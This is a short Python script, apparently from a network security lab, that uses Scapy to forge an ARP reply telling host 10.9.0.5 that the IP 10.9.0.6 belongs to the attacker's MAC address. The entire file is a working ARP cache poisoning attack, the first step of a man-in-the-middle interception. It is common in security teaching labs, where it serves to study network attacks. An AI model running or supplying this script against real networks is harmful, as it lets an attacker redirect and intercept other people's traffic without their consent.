#!/usr/bin/env python3
from scapy.all import *

attackerMAC = "02:42:0a:09:00:69"
targetMAC = "02:42:0a:09:00:05"
targetIP = "10.9.0.5"
victimIP = "10.9.0.6"

eth = Ether()
arp = ARP()

eth.src = attackerMAC 
eth.dst = targetMAC

arp.op = 2 #op = 1 for arp request, op = 2 for arp reply
arp.psrc = victimIP
arp.hwsrc = attackerMAC
arp.pdst = targetIP
arp.hwdst = targetMAC

packet = eth/arp

sendp(packet)

